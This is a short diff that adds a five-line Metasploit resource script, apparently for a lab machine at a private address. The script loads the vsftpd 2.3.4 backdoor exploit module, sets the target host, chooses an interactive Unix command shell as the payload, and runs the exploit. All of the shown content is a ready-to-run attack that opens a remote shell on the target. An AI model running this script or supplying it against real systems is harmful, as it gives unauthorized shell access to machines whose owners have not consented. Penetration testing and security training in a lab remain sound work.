@@ -1,0 +1,5 @@
+use exploit/unix/ftp/vsftpd_234_backdoor
+set RHOST 192.168.56.102
+set payload cmd/unix/interact
+exploit -z
+exit
